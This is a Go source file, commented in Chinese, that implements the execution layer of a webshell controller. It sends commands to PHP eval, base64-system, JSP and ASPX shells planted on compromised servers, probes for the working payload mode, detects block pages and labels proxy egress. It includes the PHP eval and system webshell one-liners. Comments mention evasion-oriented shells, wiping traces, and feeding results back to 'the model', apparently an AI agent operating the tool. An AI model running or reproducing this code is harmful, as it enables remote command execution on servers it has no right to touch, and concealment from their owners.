package webshell

// 执行原语：按会话类型分发到 eval 型 / 命令型。
//
// eval 型（php / php_raw）有两套载荷模式，靠一次试探确定并缓存：
//
//	eval —— 马是 <?php @eval($_POST[p]);?>，发 PHP 代码
//	raw  —— 马是 <?php @system(base64_decode($_POST[p]));?> 这类，发 base64 命令
//
// 为什么不在登记时问人：同一个目标上经常先落 eval 马、被拦后换 base64 马，
// 但 URL 和参数名一样。自动探测一次、缓存住，比要求人每次填对更可靠。探测失败
// 时把两种响应都回给模型，而不是只说一句「执行失败」。

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"time"
)

// ErrModeMismatch 表示远端不是 PHP eval 型马（HTTP 200 但没回标记），调用方
// 可以降级到命令型文件读写。
var ErrModeMismatch = errors.New("远端不是 PHP eval 型马")

// ExecResult 是一次执行的结果。
type ExecResult struct {
	Output string `json:"output"`
	// Mode 是实际生效的载荷模式：eval / raw / cmd。
	Mode string `json:"mode"`
	// Egress 是这次请求的实际出口（「直连」或代理地址），审计时用。
	Egress string `json:"egress"`
	// Truncated 表示输出被 MaxExecOutput 截断。
	Truncated bool `json:"truncated,omitempty"`
}

// execPHP 执行 php / php_raw 会话，返回 (输出, 模式)。
func execPHP(ctx context.Context, name string, sess Session, cmd string, timeout time.Duration) (string, string, error) {
	cached := modeOf(name)
	probeText := ""
	haveProbe := false

	if cached != "raw" {
		payload := phpCommandPayload(cmd, sess)
		if sess.Type == "php_raw" {
			payload = phpCodePayload(cmd, sess)
		}
		if payload == "" {
			return "", "", fmt.Errorf("%w：PHP 代码为空", ErrInvalid)
		}
		_, text, err := post(ctx, sess, payload, timeout)
		if err != nil {
			return "", "", err
		}
		inner, ok, err := extractMarked(text, sess)
		if err != nil {
			return "", "", err
		}
		if ok {
			setMode(name, "eval")
			return inner, "eval", nil
		}
		if looksBlocked(text) {
			return "", "", fmt.Errorf("远端返回的是拦截页/非命令回显（HTTP 200）: %s", brief(text, 200))
		}
		if sess.Type != "php" {
			// php_raw 只吃代码，不做命令型回退：对这类马发 base64 命令只会
			// 得到一句语法错误，还可能把马的错误日志写满。
			return "", "", fmt.Errorf("远端未回标记，疑似不是 PHP 代码执行马；响应前 200 字: %s", brief(text, 200))
		}
		probeText = text
		haveProbe = true
	}

	// 回退：base64 命令型（免杀马的常见形态，远端等价于 system(base64_decode($_POST[p]))）
	_, text2, err := post(ctx, sess, b64enc([]byte(cmd)), timeout)
	if err != nil {
		return "", "", err
	}
	if looksBlocked(text2) {
		return "", "", fmt.Errorf("远端返回的是拦截页/非命令回显（HTTP 200）: %s", brief(text2, 200))
	}
	out := cleanPlain(text2, true)
	if shellErrRE.MatchString(out) {
		probe := ""
		if haveProbe {
			probe = brief(probeText, 120)
		}
		return "", "", fmt.Errorf("无法识别该 webshell 的载荷模式（eval 试探与 base64 试探都失败）；"+
			"eval 响应: %s；base64 响应: %s", probe, brief(text2, 120))
	}
	setMode(name, "raw")
	return out, "raw", nil
}

// execCmd 按类型分发执行。
func execCmd(ctx context.Context, name string, sess Session, cmd string, timeout time.Duration) (string, string, error) {
	switch sess.Type {
	case "php", "php_raw":
		return execPHP(ctx, name, sess, cmd, timeout)
	case "jsp", "aspx":
		_, text, err := post(ctx, sess, cmd, timeout)
		if err != nil {
			return "", "", err
		}
		if looksBlocked(text) {
			return "", "", fmt.Errorf("远端返回的是拦截页/非命令回显（HTTP 200）: %s", brief(text, 200))
		}
		out := cleanPlain(text, false)
		if out == "" {
			return "", "cmd", fmt.Errorf("命令无回显（命令型马只回 stdout，检查命令是否真的有输出）")
		}
		return out, "cmd", nil
	}
	return "", "", fmt.Errorf("%w：type 只支持 %s", ErrInvalid, strings.Join(ValidTypes, "/"))
}

// runPHPCode 在 eval 型会话里直接跑一段 PHP 代码（文件读写、清痕迹的底层）。
func runPHPCode(ctx context.Context, name string, sess Session, code string, timeout time.Duration) (string, error) {
	if modeOf(name) == "raw" {
		return "", fmt.Errorf("%w：该会话已判定为「系统执行型」马，无法直接执行 PHP 代码", ErrModeMismatch)
	}
	if strings.TrimSpace(code) == "" {
		return "", fmt.Errorf("%w：PHP 代码为空", ErrInvalid)
	}
	_, text, err := post(ctx, sess, phpCodePayload(code, sess), timeout)
	if err != nil {
		return "", err
	}
	inner, ok, err := extractMarked(text, sess)
	if err != nil {
		return "", err
	}
	if !ok {
		if looksBlocked(text) {
			return "", fmt.Errorf("远端返回的是拦截页/非命令回显: %s", brief(text, 200))
		}
		msg := fmt.Errorf("远端未回标记（疑似不是 PHP eval 型马）: %s", brief(text, 200))
		if sess.Type == "php" {
			return "", fmt.Errorf("%w：%v", ErrModeMismatch, msg)
		}
		return "", msg
	}
	setMode(name, "eval")
	return inner, nil
}

// Exec 是 Manager 的执行入口。name 为空时按 sess 的临时会话执行（试连用，
// 不登记）。
func (m *Manager) Exec(ctx context.Context, name, cmd string, timeout time.Duration) (ExecResult, error) {
	sess, err := m.Get(name)
	if err != nil {
		return ExecResult{}, err
	}
	return m.execSession(ctx, name, sess, cmd, timeout)
}

func (m *Manager) execSession(ctx context.Context, name string, sess Session, cmd string, timeout time.Duration) (ExecResult, error) {
	if strings.TrimSpace(cmd) == "" {
		return ExecResult{}, fmt.Errorf("%w：命令为空", ErrInvalid)
	}
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	out, mode, err := execCmd(ctx, name, sess, cmd, timeout)
	if err != nil {
		return ExecResult{}, err
	}
	res := ExecResult{Output: out, Mode: mode, Egress: egressLabel(&sess)}
	if len(res.Output) > MaxExecOutput {
		res.Output = res.Output[:MaxExecOutput]
		res.Truncated = true
	}
	return res, nil
}

// ExecOnce 用一份临时会话执行一次（不登记、不缓存模式）。给「先试通再登记」
// 的场景用，避免把一次失败的探测写进会话库。
func ExecOnce(ctx context.Context, sess Session, cmd string, timeout time.Duration) (ExecResult, error) {
	if err := validate("probe", &sess); err != nil {
		return ExecResult{}, err
	}
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	out, mode, err := execCmd(ctx, "", sess, cmd, timeout)
	if err != nil {
		return ExecResult{}, err
	}
	res := ExecResult{Output: out, Mode: mode, Egress: egressLabel(&sess)}
	if len(res.Output) > MaxExecOutput {
		res.Output = res.Output[:MaxExecOutput]
		res.Truncated = true
	}
	return res, nil
}
